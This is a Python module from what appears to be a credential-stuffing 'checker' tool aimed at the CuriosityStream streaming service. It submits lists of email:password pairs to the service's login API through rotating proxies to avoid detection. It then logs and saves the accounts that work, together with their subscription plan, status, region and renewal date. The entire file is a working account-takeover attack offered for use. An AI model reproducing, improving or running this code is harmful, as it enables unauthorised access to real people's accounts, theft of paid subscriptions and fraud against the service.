from modules.variables import Checker
from modules.functions import bad_proxy, log,save,set_proxy
from requests import get,post

def check(email:str,password:str):
    retries = 0
    while retries != Checker.retries:
        proxy = set_proxy()
        proxy_set = set_proxy(proxy)
        try:
            response = post(f"https://api.curiositystream.com/v1/login/?platform=google&email={email}&password={password}",proxies=proxy_set,timeout=Checker.timeout)
            if "\"error\"" in response.text or "The login credentials are incorrect. Please try again." in response.text:
                retries += 1
            elif "status\":\"success" in response.text in response.text:
                if "plan\":[]" in response.text or "\"is_active\": false" in response.text:
                    if not Checker.cui:
                        log("custom",email+":"+password,"CuriosityStream")
                    save("CuriosityStream","custom",Checker.time,email+":"+password)
                    Checker.custom += 1
                    Checker.cpm += 1
                    return
                else:
                    plan = response.json()["message"]["subscription"]["plan"]["name"]
                    status = response.json()["message"]["subscription"]["state"]["reason"]
                    region = response.json()["message"]["country"]
                    renew = response.json()["message"]["subscription_ends_at"]
                    if not Checker.cui:
                        log("good",email+":"+password,"CuriosityStream")
                    save("CuriosityStream","good",Checker.time,email+":"+password+f" | Plan: {plan} | Status: {status} | Region: {region} | Renew: {renew}")
                    Checker.good += 1
                    Checker.cpm += 1
                    return
            else:
                raise
        except:
            bad_proxy(proxy)
            Checker.errors += 1
    Checker.bad += 1
    Checker.cpm += 1
    return